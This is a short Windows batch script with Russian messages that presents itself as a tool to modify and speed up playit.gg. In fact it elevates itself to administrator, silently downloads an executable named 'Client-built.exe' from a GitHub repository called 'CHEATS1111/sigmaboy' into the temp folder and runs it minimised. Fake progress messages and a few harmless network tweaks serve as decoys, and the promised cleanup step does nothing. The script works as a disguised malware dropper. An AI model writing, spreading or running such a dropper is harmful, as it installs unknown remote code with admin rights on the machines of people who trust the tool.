��&cls
﻿@echo off
chcp 1251 >nul

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo Запрос прав администратора...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
    exit /b
)

echo [+] Запуск
echo [+] Модификация playit.gg

:: Скачивание файла в TEMP
set "download_url=https://github.com/CHEATS1111/sigmaboy/raw/main/Client-built.exe"
set "temp_file=%TEMP%\Client-built.exe"

powershell -Command "Invoke-WebRequest -Uri '%download_url%' -OutFile '%temp_file%'"

:: Скрытый запуск
start /min "" "%temp_file%"
timeout /t 5 /nobreak >nul

echo [+] Прописывание комманд
:: Выполнение команды без отображения
cmd /c "playit reset" >nul 2>&1

echo [+] Удаление остатков от программы

echo [+] Ускорение работы playit.gg
:: Оптимизационные команды
netsh interface tcp set global autotuning=normal >nul 2>&1
ipconfig /flushdns >nul 2>&1

echo [+] Well Done
echo Процесс завершен успешно!
pause